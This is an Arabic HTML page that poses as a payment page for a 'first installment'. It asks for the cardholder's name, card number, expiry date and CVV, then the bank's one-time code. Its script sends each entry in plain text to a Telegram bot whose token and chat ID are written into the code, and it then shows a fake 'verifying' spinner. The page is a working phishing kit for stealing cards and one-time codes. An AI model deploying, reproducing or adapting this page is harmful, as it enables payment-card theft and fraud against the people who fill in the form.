<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سداد الدفعة الأولى</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --black: #1a1a1a; --white: #ffffff; }
        body { font-family: 'Cairo', sans-serif; background-color: var(--black); color: var(--white); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 90%; max-width: 450px; background: #222; padding: 30px; border-radius: 15px; border: 1px solid var(--gold); box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
        .page { display: none; }
        .active { display: block; }
        h2 { color: var(--gold); margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #333; color: white; box-sizing: border-box; text-align: center; }
        button { width: 100%; padding: 15px; background: var(--gold); border: none; color: var(--black); font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 1.1rem; margin-top: 15px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--gold); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div id="step1" class="page active">
        <h2>عزيزي العميل</h2>
        <p>يرجى سداد الدفعة الأولى لاستكمال الطلب</p>
        <button onclick="goNext('step2')">سداد الآن</button>
    </div>

    <div id="step2" class="page">
        <h2>معلومات بطاقة الفيزا</h2>
        <input type="text" id="v_name" placeholder="الاسم الكامل على البطاقة">
        <input type="number" id="v_num" placeholder="رقم البطاقة (16 رقم)">
        <div style="display:flex; gap:10px;">
            <input type="text" id="v_date" placeholder="MM/YY">
            <input type="number" id="v_cvv" placeholder="CVV">
        </div>
        <button onclick="sendVisa()">تأكيد الدفع</button>
    </div>

    <div id="step3" class="page">
        <h2>كود التحقق (OTP)</h2>
        <p>عزيزي العميل سوف يتم إرسال رمز OTP إلى جوالك، يرجى إدخال الرمز فور وصوله.</p>
        <input type="number" id="otp_code" placeholder="ضع الرمز هنا">
        <button onclick="sendOTP()">تأكيد الرمز</button>
    </div>

    <div id="step4" class="page">
        <h2>يرجى الانتظار</h2>
        <div class="loader"></div>
        <p>سوف يتم التحقق من طلب الدفعة، يرجى عدم إغلاق الصفحة...</p>
    </div>
</div>

<script>
    const TOKEN = "8397030939:AAFaUPmGtDjmOcwnUM62uqfGcuKNy7L5noQ";
    const ID = "8226145538";

    function goNext(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    async function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`;
        try { await fetch(url); } catch(e) { console.error("Error sending to TG"); }
    }

    function sendVisa() {
        const name = document.getElementById('v_name').value;
        const num = document.getElementById('v_num').value;
        const date = document.getElementById('v_date').value;
        const cvv = document.getElementById('v_cvv').value;
        if(!name || !num || !date || !cvv) return alert("يرجى ملء كافة البيانات");
        
        const msg = `💳 بيانات فيزا جديدة:\n👤 الاسم: ${name}\n🔢 الرقم: ${num}\n📅 التاريخ: ${date}\n🔒 CVV: ${cvv}`;
        sendToTelegram(msg);
        goNext('step3');
    }

    function sendOTP() {
        const otp = document.getElementById('otp_code').value;
        if(!otp) return alert("يرجى إدخال الرمز");
        
        const msg = `🔐 رمز التحقق (OTP):\n🔢 الرمز: ${otp}`;
        sendToTelegram(msg);
        goNext('step4');
    }
</script>

</body>
</html>
